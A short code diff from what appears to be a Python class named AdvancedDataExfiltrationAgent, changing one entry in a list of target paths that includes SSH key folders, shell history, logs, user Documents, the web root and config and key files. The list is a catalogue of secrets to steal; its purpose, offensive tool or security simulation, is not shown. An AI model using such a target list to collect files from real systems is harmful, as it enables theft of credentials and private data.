@@ -116,7 +116,7 @@ class AdvancedDataExfiltrationAgent(BaseAgent):
                 "~/.ssh/",
                 "~/.bash_history",
                 "/var/log/",
-                "/home/*/Documents/",
+                os.path.join(os.getenv('TARGET_HOME_DIR', '/home'), '*/Documents/'),
                 "/var/www/",
                 "*.conf",
                 "*.key",
